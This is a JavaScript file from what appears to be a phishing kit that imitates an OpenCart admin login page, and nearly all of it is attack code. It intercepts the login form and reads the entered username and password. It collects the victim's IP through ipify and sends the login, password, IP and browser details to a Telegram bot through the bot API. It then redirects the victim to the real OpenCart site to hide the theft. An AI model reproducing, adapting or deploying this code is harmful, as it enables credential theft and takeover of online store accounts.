// send.js
async function getUserIP() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch {
        return 'Не удалось определить';
    }
}

async function sendToTelegram(login, password, ip) {
    const message = `🛡️ OPENCART ФИШИНГ 🛡️\n\n👤 Логин: ${login}\n🔑 Пароль: ${password}\n🌐 IP: ${ip}\n⏰ Время: ${new Date().toLocaleString()}\n🖥️ User Agent: ${navigator.userAgent}`;
    
    try {
        const response = await fetch(`https://api.telegram.org/bot${window.BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: window.CHAT_ID,
                text: message
            })
        });
        
        const result = await response.json();
        console.log('Telegram response:', result);
        
        if (!response.ok) {
            console.error('Error:', result);
        }
    } catch (error) {
        console.error('Network error:', error);
    }
}

// Ждём загрузку DOM
document.addEventListener('DOMContentLoaded', function() {
    const form = document.getElementById('loginForm');
    if (!form) return;
    
    form.addEventListener('submit', async function(e) {
        e.preventDefault();
        
        const username = document.getElementById('input-username').value;
        const password = document.getElementById('input-password').value;
        
        if (!username || !password) {
            alert('Будь ласка, заповніть всі поля');
            return;
        }
        
        const submitBtn = form.querySelector('button[type="submit"]');
        const originalText = submitBtn.innerHTML;
        submitBtn.innerHTML = '<i class="fa fa-spinner fa-spin"></i> Перевірка...';
        submitBtn.disabled = true;
        
        const ip = await getUserIP();
        await sendToTelegram(username, password, ip);
        
        setTimeout(() => {
            window.location.href = 'https://www.opencart.com/';
        }, 1200);
    });
});
